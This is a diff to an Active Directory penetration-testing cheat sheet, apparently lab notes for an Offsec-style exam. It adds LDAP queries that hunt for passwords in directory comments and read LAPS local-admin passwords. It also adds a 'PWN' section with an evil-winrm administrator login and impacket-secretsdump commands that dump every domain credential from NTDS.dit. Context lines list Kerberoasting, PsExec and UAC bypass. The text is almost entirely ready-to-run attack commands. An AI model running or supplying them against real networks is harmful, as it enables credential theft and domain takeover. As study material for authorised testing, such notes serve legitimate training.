@@ -46,15 +46,27 @@ Zone Transfer
 dnsrecon -d mike.com -t axfr  
 nmap --script=dns-zone-transfer -p 53 ns2.mike.com 
 
-LDAP
+
+===================================
+LDAP Domain Name
 nmap -n -sV --script "ldap* and not brute" 192.168.200.5
-ldapsearch -x -h 192.168.200.5 -s base namingcontexts  
-ldapsearch -x -h 192.168.200.5 -b 'DC=mike,DC=com' -s sub | grep -i sam  
-ldapsearch -x -h 192.168.200.5 -D '' -w '' -b "DC=mike,DC=com" |  grep sAMAccountName: 
-ldapsearch -x -h 192.168.200.5 -D "cn=admin,dc=mike,dc=com" -s sub "cn=*"
+
+LDAP User Search
+Might find an interesting Comment. No password needed. 
+ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.200.5" "(objectclass=*)" | grep -i -e 'pass\|name\|desc' 
+
+LDAP Other Searches
+ldapsearch -x -H "ldap://192.168.200.5" -s base namingcontexts  
+ldapsearch -x -H "ldap://192.168.200.5" -b 'DC=mike,DC=com' -s sub | grep -i sam  
+ldapsearch -x -H "ldap://192.168.200.5" -D '' -w '' -b "DC=mike,DC=com" |  grep sAMAccountName: 
+ldapsearch -x -H "ldap://192.168.200.5" -D "cn=admin,dc=mike,dc=com" -s sub "cn=*"
+
+LDAP Query with Creds 
+Might find the 'LAPS' Admin password 
+dir "c:\Program Files"  ..LAPS
+ldapsearch -v -x -D bob@mike.com -w paxxword -b "DC=mike,DC=com" -H "ldap://192.168.200.5" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
 
 
- 
 ===================================
 Easy Roast (needs creds/hash/ticket) 
 
@@ -132,12 +144,7 @@ PS> net user \\mydc
 PS> klist  
 PS> PsExec.exe \\mydc cmd.exe  
   
-===================================
-All DC Creds (needs DA user) 
 
-impacket-secretsdump mydomain/dauser@192.168.200.5
-impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract 
-  
  
 ===================================
 Domain Enums with PowerView 
@@ -206,3 +213,10 @@ Get-NetLoggedon -ComputerName client251
 Get-NetSession -ComputerName dc01   
 Invoke-Kerberoast  
 Invoke-BypassUAC  
+
+==================================  
+PWN
+
+evil-winrm -i 192.168.200.5 -u administrator -p paxxword
+impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract 
+impacket-secretsdump mike.com/administrator@192.168.200.5
